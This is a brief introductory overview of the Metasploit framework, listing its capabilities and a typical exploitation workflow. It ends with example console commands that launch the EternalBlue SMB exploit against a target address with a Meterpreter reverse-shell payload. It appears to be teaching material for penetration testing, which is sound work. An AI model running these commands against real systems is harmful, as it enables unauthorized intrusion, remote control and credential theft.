Metasploit allows a user to do the following
- Discover vulnerabilities in systems and applications
- Scan and enumerate networks and services
- Launch known exploits against vulnerable targets
- Deliver payuloads after succesful exploitation
- Gain remote command-line or Meterpreter access
- Perform post-exploitation activities like privilege escalation, credential gathering, and lateral movement
- Test security defenses and validate whether vulnerabilities are actually exploitable
- Automate penetration testing workflows
- Develop and test custom exploits, payloads, and modules

A common workflow looks like:
Scan a target
Find a vulnerability
Select an exploit module
Configure a payload
Launch the exploit
Interact with the compromised system

Example:
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

